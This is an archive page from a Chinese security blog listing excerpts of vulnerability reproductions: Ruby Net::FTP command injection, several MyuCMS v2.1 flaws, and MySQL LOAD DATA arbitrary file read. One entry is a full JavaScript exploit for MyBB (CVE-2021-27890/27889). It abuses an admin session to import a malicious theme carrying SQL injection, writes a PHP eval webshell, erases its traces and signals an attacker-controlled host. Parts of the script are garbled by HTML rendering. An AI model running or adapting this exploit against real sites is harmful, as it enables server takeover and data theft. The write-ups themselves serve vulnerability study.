<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/page/59/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main">
  

    
    <article id="post-Net__FTP/（CVE-2017-17405）Net__FTP 模块命令注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Net__FTP/%EF%BC%88CVE-2017-17405%EF%BC%89Net__FTP%20%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:00.056Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2017-17405）Net-FTP-模块命令注入漏洞"><a href="#（CVE-2017-17405）Net-FTP-模块命令注入漏洞" class="headerlink" title="（CVE-2017-17405）Net::FTP 模块命令注入漏洞"></a>（CVE-2017-17405）Net::FTP 模块命令注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Ruby Net::FTP<br>模块是一个FTP客户端，在上传和下载文件的过程中，打开本地文件时使用了<code>open</code>函数。而在ruby中，<code>open</code>函数是借用系统命令来打开文件，且没用过滤shell字符，导致在用户控制文件名的情况下，将可以注入任意命令。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Ruby &lt; 2.4.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>因为这是一个FTP客户端的漏洞，所以我们需要先运行一个可以被访问到的服务端。比如使用python：</p>
<pre><code># 安装pyftpdlib
pip install pyftpdlib

# 在当前目录下启动一个ftp服务器，默认监听在`0.0.0.0:2121`端口
python3 -m pyftpdlib -p 2121 -i 0.0.0.0
</code></pre>
<p>然后即可开始利用漏洞。注入命令<code>|touch$&#123;IFS&#125;success.txt</code>（空格用<code>$&#123;IFS&#125;</code>代替，原因不表），发送如下数据包即可（其中uri指定的ftp服务器就是我用python运行的一个简单的ftp<br>server，其中无需放置任何文件）：</p>
<p><img src="/resource/(CVE-2017-17405)Net::FTP%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.png" alt="1.png"></p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Net__FTP/%EF%BC%88CVE-2017-17405%EF%BC%89Net__FTP%20%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Net__FTP/%EF%BC%88CVE-2017-17405%EF%BC%89Net__FTP%20%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsxc00c5y8v1h3yuesek" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-MyuCMS/MyuCMS v2.1 文件上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:59.993Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="MyuCMS-v2-1-文件上传漏洞"><a href="#MyuCMS-v2-1-文件上传漏洞" class="headerlink" title="MyuCMS v2.1 文件上传漏洞"></a>MyuCMS v2.1 文件上传漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>MyuCMS v2.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>CNVD 上对应的标题为 <strong>myucms fo***.php页面存在文件上传漏洞</strong></p>
<p>搜索项目中fo开头的文件，定位到<br><strong>application/admin/controller/Forum.php</strong> 中的 <strong>doUploadPic</strong> 方法</p>
<pre><code>public function doUploadPic()
    &#123;
        $file = request()-&gt;file(&#39;FileName&#39;);
        $info = $file-&gt;move(ROOT_PATH . DS . &#39;uploads&#39;);
        if($info)&#123;
            $path = WEB_URL . DS . &#39;uploads&#39; . DS .$info-&gt;getSaveName();
            echo str_replace(&quot;\\&quot;,&quot;/&quot;,$path);
        &#125;
    &#125;
</code></pre>
<p>可以看到上述代码调用了 <strong>Thinkphp</strong> 内置的 <strong>move</strong><br>方法来对上传的文件进行处理。但是在调用 <strong>move</strong> 方法前未调用<br><strong>validate()</strong> 方法来设置验证规则。以至于此处形成了任意文件上传漏洞。</p>
<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3>
        
          <p class="article-more-link">
            <a href="/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsse00bzy8v17psf18v1" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-MyuCMS/MyuCMS v2.1 命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:59.991Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="MyuCMS-v2-1-命令执行漏洞"><a href="#MyuCMS-v2-1-命令执行漏洞" class="headerlink" title="MyuCMS v2.1 命令执行漏洞"></a>MyuCMS v2.1 命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>MyuCMS v2.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>CNVD上没有说明存在的页面。我找到的是一处能控制 <strong>extre/web.php</strong><br>内容的漏洞。</p>
<p>漏洞成因是使用 <strong>file_put_contents</strong> 函数更新 <strong>extre</strong><br>下配置文件的内容时，未对参数内容做验证，而直接通过循环遍历，拼接到了php后缀的配置文件中。</p>
<p>相同原理漏洞影响3个文件共5处。分别为<br><strong>application/admin/controller/Config.php</strong>，<br><strong>application/admin/controller/Muban.php</strong><br>，<strong>application/admin/controller/Point.php</strong></p>
<p>此处以 <strong>application/admin/controller/Config.php</strong> 下的 <strong>add()</strong><br>方法为例分析</p>
<pre><code>public function add()
    &#123;
       $path = &#39;application/extra/web.php&#39;;
       $file = include $path;      // $file 的内容为 web.php 中返回的配置数组的值
       $config = array( // 读取 post 中提交的配置内容
         &#39;WEB_RXT&#39; =&gt; input(&#39;WEB_RXT&#39;),
         &#39;WEB_GL&#39; =&gt; input(&#39;WEB_GL&#39;),
         &#39;WEB_REG&#39; =&gt; input(&#39;WEB_REG&#39;),
         &#39;WEB_TAG&#39; =&gt; input(&#39;WEB_TAG&#39;),
         &#39;WEB_OPE&#39; =&gt; input(&#39;WEB_OPE&#39;),
         &#39;WEB_BUG&#39; =&gt; input(&#39;WEB_BUG&#39;),
         &#39;WEB_BBS&#39; =&gt; input(&#39;WEB_BBS&#39;),
         &#39;WEB_SHOP&#39; =&gt; input(&#39;WEB_SHOP&#39;),
         &#39;WEB_INDEX&#39; =&gt; input(&#39;WEB_INDEX&#39;),
         &#39;WEB_KEJIAN&#39; =&gt; input(&#39;WEB_KEJIAN&#39;),
         &#39;WEB_KEJIANS&#39; =&gt; input(&#39;WEB_KEJIANS&#39;),
         &#39;Cascade&#39; =&gt; input(&#39;Cascade&#39;),
         //七牛
         &#39;bucket&#39; =&gt; input(&#39;bucket&#39;),
         &#39;accessKey&#39; =&gt; input(&#39;accessKey&#39;),
         &#39;secrectKey&#39; =&gt; input(&#39;secrectKey&#39;),
         &#39;domain&#39; =&gt; input(&#39;domain&#39;),
         &#39;qiniuopen&#39; =&gt; input(&#39;qiniuopen&#39;),
       );
        $res = array_merge($file, $config); // 合并两个数组
        $str = &#39;&lt;?php return [&#39;;
        foreach ($res as $key =&gt; $value) &#123; // 循环数组，生成新的配置内容
            $str .= &#39;\&#39;&#39; . $key . &#39;\&#39;&#39; . &#39;=&gt;&#39; . &#39;\&#39;&#39; . $value . &#39;\&#39;&#39; . &#39;,&#39;;
        &#125;
        $str .= &#39;]; &#39;;
        if (file_put_contents($path, $str)) &#123; // 将配置内容写入 web.php 文件
            return json(array(&#39;code&#39; =&gt; 200, &#39;msg&#39; =&gt; &#39;修改成功&#39;));
        &#125; else &#123;
            return json(array(&#39;code&#39; =&gt; 0, &#39;msg&#39; =&gt; &#39;修改失败&#39;));
        &#125;
    &#125;
</code></pre>
        
          <p class="article-more-link">
            <a href="/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsqx00byy8v1e6mv53f1" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-MyuCMS/MyuCMS v2.1 前台任意文件下载" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" class="article-date">
  <time datetime="2022-07-08T06:25:59.989Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="MyuCMS-v2-1-前台任意文件下载"><a href="#MyuCMS-v2-1-前台任意文件下载" class="headerlink" title="MyuCMS v2.1 前台任意文件下载"></a>MyuCMS v2.1 前台任意文件下载</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>MyuCMS v2.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>既然是文件下载，先在整个项目中搜索下 <strong>download</strong><br>关键字，尝试看看能不能直接定位到关键代码。</p>
<p>通过搜索定位到 <strong>bbs</strong> 模块下的 <strong>Index</strong> 控制器的 <strong>download</strong> 方法。</p>
<p><a target="_blank" rel="noopener" href="https://pic.downk.cc/item/5e4266e52fb38b8c3c9e7e3d.jpg"><img src="/resource/MyuCMSv2.1%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/media/rId24.jpg" alt="img"></a></p>
<p><strong>download</strong> 方法接受三个参数，这三个参数我们是完全可控的，单从<br><strong>download</strong> 这个方法来看，无任何参数内容限制，直接将 <strong>$url</strong> 和<br><strong>$name</strong> 两个参数传递给了 <strong>Http</strong> 类的 <strong>download</strong> 方法来执行下载。</p>
<p>若 <strong>Http-&gt;download()</strong><br>方法中还未对参数内容进行限制，便会造成任意文件下载漏洞。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/" data-id="cl5c2qsqv00bxy8v14av09tlj" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-MyuCMS/MyuCMS v2.1 任意目录删除漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:59.986Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="MyuCMS-v2-1-任意目录删除漏洞"><a href="#MyuCMS-v2-1-任意目录删除漏洞" class="headerlink" title="MyuCMS v2.1 任意目录删除漏洞"></a>MyuCMS v2.1 任意目录删除漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>MyuCMS v2.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>因为漏洞描述是任意文件删除，所以先全文搜索 <strong>unlink</strong><br>函数，定位到存在文件删除功能的代码段。</p>
<p>定位到 <strong>application/common.php</strong> 中的 <strong>deleteun</strong> 函数</p>
<p><img src="/resource/MyuCMSv2.1%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/media/rId24.jpg" alt="1.jpg"></p>
<pre><code>function deleteun($dir_name)
&#123;
    $result = false;
    if (is_dir($dir_name)) &#123; // 判断是否为目录
        if ($handle = opendir($dir_name)) &#123; // 打开目录
            while (false !== ($item = readdir($handle))) &#123; // 通过这个 while 遍历目录中的文件 
                if ($item != &#39;.&#39; &amp;&amp; $item != &#39;..&#39;) &#123;
                    if (is_dir($dir_name . DS . $item)) &#123; // 若遍历到的文件为子目录，则递归调用deleteun
                        deleteun($dir_name . DS . $item);
                    &#125; else &#123;
                        unlink($dir_name . DS . $item); // 删除遍历到的文件
                    &#125;
                &#125;
            &#125;
            closedir($handle); // 关闭文件夹
            if (rmdir($dir_name)) &#123; // 删除该目录
                $result = true;
            &#125;
        &#125;
    &#125;

    return $result;
&#125;
</code></pre>
<p>根据 <strong>deleteun</strong><br>函数的实现代码来看，我们可以看到该函数中对传入的参数无任何限制。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsqu00bwy8v13b211g8g" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-MyuCMS/MyuCMS v2.1 sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/MyuCMS/MyuCMS%20v2.1%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:59.984Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="MyuCMS-v2-1-sql注入漏洞"><a href="#MyuCMS-v2-1-sql注入漏洞" class="headerlink" title="MyuCMS v2.1 sql注入漏洞"></a>MyuCMS v2.1 sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>MyuCMS v2.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>在 CNVD 上的描述为，<strong>MyuCMS us*<em>*_xi*</em>*.html页面存在SQL注入漏洞</strong></p>
<p>通过对整个项目文件的搜索，最终确定为 <strong>user_xiaoxi.html</strong> 文件。</p>
<p>该视图文件，对应的控制器为 <strong>application/bbs/controller/User.php</strong><br>。显示消息为 <strong>User-&gt;xiaoxi()</strong><br>方法。该方法中无用户可控参数。所以注入不可能在此方法中。</p>
<p><img src="/resource/MyuCMSv2.1sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.jpg" alt="1.jpg"></p>
<p>如图所示功能处可将未读消息更改为已读消息。同时我们抓包观察。未读消息为其他用户在登录用户发布的文章下留言所产生。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/MyuCMS/MyuCMS%20v2.1%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/MyuCMS/MyuCMS%20v2.1%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsqs00bvy8v1a20hfbov" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-Mysql/MySQL LOAD DATA 读取客户端任意文件" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Mysql/MySQL%20LOAD%20DATA%20%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" class="article-date">
  <time datetime="2022-07-08T06:25:59.924Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="MySQL-LOAD-DATA-读取客户端任意文件"><a href="#MySQL-LOAD-DATA-读取客户端任意文件" class="headerlink" title="MySQL LOAD DATA 读取客户端任意文件"></a>MySQL LOAD DATA 读取客户端任意文件</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h3 id="LOAD-DATA-INFILE"><a href="#LOAD-DATA-INFILE" class="headerlink" title="LOAD DATA INFILE"></a>LOAD DATA INFILE</h3><p>mysql的LOAD DATA<br>INFILE语句主要用于读取一个文件的内容并且存入一个表中。通常有两种用法，分别是：</p>
<pre><code>load data infile &quot;/etc/passwd&quot; into table TestTable fields terminated by &#39;分隔符&#39;;
load data local infile &quot;/etc/passwd&quot; into table TestTable fields terminated by &#39;分隔符&#39;;
</code></pre>
<p>第一个语句是读取服务器上的/etc/passwd文件并存入TestTable表中，第二个语句是读取客户端本地的/etc/passwd文件并存入TestTable表中。我们要利用的是LOAD<br>DATA LOCAL INFILE。官方文档中也提出了这个问题（PS：Google翻译的不是很准确）</p>
<p><img src="/resource/MySQLLOADDATA%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/media/rId23.png"></p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="分析数据包"><a href="#分析数据包" class="headerlink" title="分析数据包"></a>分析数据包</h3>
        
          <p class="article-more-link">
            <a href="/2022/07/07/Mysql/MySQL%20LOAD%20DATA%20%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Mysql/MySQL%20LOAD%20DATA%20%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" data-id="cl5c2qssi00c0y8v19wl52ow6" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-MyBB/resource/Mybb-XSS_SQL_RCE-POC(CVE-2021-27890&amp;CVE-2021-27889)/media/1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/MyBB/resource/Mybb-XSS_SQL_RCE-POC(CVE-2021-27890&CVE-2021-27889)/media/1/" class="article-date">
  <time datetime="2022-07-08T06:25:59.826Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        var bashurl = 'http://192.168.92.164/mybb/mybb-mybb_1825'
var attack_url = 'http://192.168.92.165:8080/attack_success'
var my_post_key = ''
var source_theme = '';
var evil_theme_set = ''
var evil_theme_tid = ''

function sleep (time) {
  return new Promise((resolve) => setTimeout(resolve, time));
}

function get_themes(){
	var url = bashurl + '/admin/index.php?module=style'

	var xhr=new XMLHttpRequest();
    xhr.open('GET',url,false);
    xhr.onreadystatechange=function(){
        // readyState == 4说明请求已完成
        if(xhr.readyState==4){
            if(xhr.status==200 || xhr.status==304){
                var res = xhr.responseText;

                var parser = new DOMParser();
                var doc3 = parser.parseFromString(res, "text/html");
                var source_theme_tid = '';

                imgs = doc3.getElementsByTagName("img");

                for(var i=0;i<imgs.length;i++){ if(imgs[i].alt="=" 'default theme'){ source_theme_tid="imgs[i]" break } get my post key var postkey="doc3.getElementById('welcome').lastElementChild" my_post_key="postKey.href.split('my_post_key=')[1]" reset url source_theme="bashurl" + ' admin index.php?module="style-themes&action=set_default&tid='" '&my_post_key=" + my_post_key
            }
        }
    }
    xhr.send();
}

function import_xml(){
   	var formData = new FormData();
	var url = bashurl + " formdata.append("my_post_key", my_post_key); formdata.append("import", 0); formdata.append("url", ""); formdata.append("tid", "1"); formdata.append("name", "eviltheme1"); formdata.append("import_stylesheets", formdata.append("import_templates", javascript file-like object content="[" '<?xml version="1.0" encoding="UTF-8" ?>',
		'<theme name="Default" version="1825">',
		'<properties>',
		'<templateset><!--[CDATA[999\') and 1=2 union select \'header_welcomeblock_member_user\',\'${file_put_contents($_GET[0],$_GET[1])};\' union select \'header_welcomeblock_member_admin\',\'${file_put_contents($_GET[0],$_GET[1])};\' union select \'header_welcomeblock_guest_login_modal\',\'${file_put_contents($_GET[0],$_GET[1])};\'#]]--></templateset>',
		'<imgdir><!--[CDATA[images]]--></imgdir>',
		'<logo><!--[CDATA[images/logo.png]]--></logo>',
		'<tablespace><!--[CDATA[5]]--></tablespace>',
		'<borderwidth><!--[CDATA[0]]--></borderwidth>',
		'<editortheme><!--[CDATA[mybb.css]]--></editortheme>',
		'<disporder></disporder>',
		'<colors></colors>',
		'</properties>',
		'<stylesheets>',
		'<stylesheet name="color_black.css" attachedto="black" version="1825">',
		'</stylesheet>',
		'</stylesheets>',
		'<templates>',
		'</templates>',
		'</theme>'
	].join('\n');


	var blob = new Blob([content], { type: "text/xml"});

	formData.append("local_file", blob);

	var request = new XMLHttpRequest();
	request.open("POST", url);
	request.send(formData);
}

function set_evil_theme(){
	var url = bashurl + '/admin/index.php?module=style'

	var xhr=new XMLHttpRequest();
    xhr.open('GET',url,false);
    xhr.onreadystatechange=function(){
        // readyState == 4说明请求已完成
        if(xhr.readyState==4){
            if(xhr.status==200 || xhr.status==304){
                var res = xhr.responseText;
                var evil_theme = '';

                var parser = new DOMParser();
                var doc3 = parser.parseFromString(res, "text/html");
                aTag = doc3.getElementsByTagName("a")

 				for(var i=0;i<atag.length;i++){ if(atag[i].innerhtml="=" 'eviltheme1'){ evil_theme="aTag[i]" break } get set url evil_theme_set="evil_theme.parentNode.parentNode.previousElementSibling.firstElementChild.href" console.log('evil_theme_set: ' + evil_theme_set) delete evil_theme_tid="evil_theme.href.split('tid=')[1]" console.log('evil_theme_tid: evil_theme_tid) xhr.send(); default thme var xhr2="new" xmlhttprequest(); xhr2.open('get',evil_theme_set,false); xhr2.send(); function trigger_rce(){ xhr="new" xhr.open('get',bashurl index.php?0="cache/evil.php&1=<?php" eval($_get[100]);?>',false);
    xhr.send();
}

function clean(){
	// reset default theme
    var xhr1=new XMLHttpRequest();
    xhr1.open('GET',source_theme,false);
    xhr1.send();


    var xhr2 = new XMLHttpRequest();
    var formData = new FormData();
	var url = bashurl + '/admin/index.php?module=style-themes&action=delete&tid=' + evil_theme_tid
	formData.append("my_post_key", my_post_key);
	xhr2.open("POST", url);
	xhr2.send(formData);
}

function notice_attack(){
 	var xhr1=new XMLHttpRequest();
    xhr1.open('GET',attack_url,false);
    xhr1.send();
}

get_themes()

if(my_post_key != ''){
	import_xml()

	sleep(300).then(() => {
	    set_evil_theme()
	    trigger_rce()
	    clean()
	    notice_attack()
	})
}</atag.length;i++){></imgs.length;i++){>
        
          <p class="article-more-link">
            <a href="/2022/07/07/MyBB/resource/Mybb-XSS_SQL_RCE-POC(CVE-2021-27890&CVE-2021-27889)/media/1/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/MyBB/resource/Mybb-XSS_SQL_RCE-POC(CVE-2021-27890&CVE-2021-27889)/media/1/" data-id="cl5c2qt8700cty8v13x4q7esi" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-MyBB/Mybb-XSS_SQL_RCE-POC(CVE-2021-27890 &amp; CVE-2021-27889)" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/MyBB/Mybb-XSS_SQL_RCE-POC(CVE-2021-27890%20&%20CVE-2021-27889)/" class="article-date">
  <time datetime="2022-07-08T06:25:59.815Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
